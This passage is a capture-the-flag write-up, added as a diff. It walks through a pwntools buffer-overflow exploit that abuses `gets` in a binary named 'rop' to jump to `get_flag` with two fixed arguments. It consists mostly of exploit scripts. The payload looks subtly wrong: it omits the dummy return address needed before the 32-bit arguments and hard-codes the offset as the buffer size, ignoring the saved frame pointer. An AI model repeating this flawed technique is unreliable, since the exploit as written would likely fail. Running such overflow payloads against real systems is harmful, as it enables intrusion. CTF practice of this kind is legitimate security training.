@@ -1,0 +1,124 @@
+To solve this challenge using pwntools, we need to exploit the `gets` function, which is vulnerable to a buffer overflow. The goal is to call the `get_flag` function with the correct arguments. Here’s a step-by-step guide and the corresponding code:
+
+### Step 1: Set Up Your Environment
+Make sure you have pwntools installed. You can install it using pip if you haven't already:
+```sh
+pip install pwntools
+```
+
+### Step 2: Analyze the Binary
+From the decompiled code, we see that the `main` function calls `gets` to read input into a buffer of size 56 bytes. This is a classic buffer overflow vulnerability.
+
+The `get_flag` function requires two specific arguments:
+- `a1 == 814536271`
+- `a2 == 425138641`
+
+We need to overwrite the return address of `main` to point to `get_flag` and set up the stack with these two arguments.
+
+### Step 3: Find the Offset
+First, we need to determine the offset at which the return address is overwritten. We can use a pattern to find this offset.
+
+```python
+from pwn import *
+
+# Start the process
+p = process('./rop')
+
+# Generate a cyclic pattern
+pattern = cyclic(100)
+
+# Send the pattern
+p.sendline(pattern)
+
+# Wait for the process to crash
+p.wait()
+
+# Get the core dump
+core = Coredump('./core')
+
+# Find the offset
+offset = cyclic_find(core.eip)
+print(f"Offset: {offset}")
+```
+
+### Step 4: Craft the Payload
+Now that we know the offset, we can craft the payload to overwrite the return address and set up the arguments for `get_flag`.
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./rop')
+
+# Start the process
+p = process('./rop')
+
+# Address of get_flag
+get_flag_addr = elf.symbols['get_flag']
+
+# Arguments for get_flag
+arg1 = 814536271
+arg2 = 425138641
+
+# Offset found from the previous step
+offset = 56
+
+# Create the payload
+payload = b''
+payload += b'A' * offset  # Padding to reach the return address
+payload += p32(get_flag_addr)  # Overwrite the return address with the address of get_flag
+payload += p32(arg1)  # First argument
+payload += p32(arg2)  # Second argument
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode
+p.interactive()
+```
+
+### Step 5: Run the Exploit
+Run the script to exploit the binary and get the flag.
+
+### Full Script
+Here is the full script combining all the steps:
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./rop')
+
+# Start the process
+p = process('./rop')
+
+# Address of get_flag
+get_flag_addr = elf.symbols['get_flag']
+
+# Arguments for get_flag
+arg1 = 814536271
+arg2 = 425138641
+
+# Offset found from the previous step
+offset = 56
+
+# Create the payload
+payload = b''
+payload += b'A' * offset  # Padding to reach the return address
+payload += p32(get_flag_addr)  # Overwrite the return address with the address of get_flag
+payload += p32(arg1)  # First argument
+payload += p32(arg2)  # Second argument
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode
+p.interactive()
+```
+
+### Notes
+- Ensure the binary is not compiled with stack protection (e.g., `-fno-stack-protector`).
+- If ASLR is enabled, you may need to disable it or use a leak to find the base address.
+- The script assumes the binary is 32-bit. If it's 64-bit, adjust the payload accordingly (use `p64` instead of `p32`).
+
+This should help you solve the challenge and get the flag!
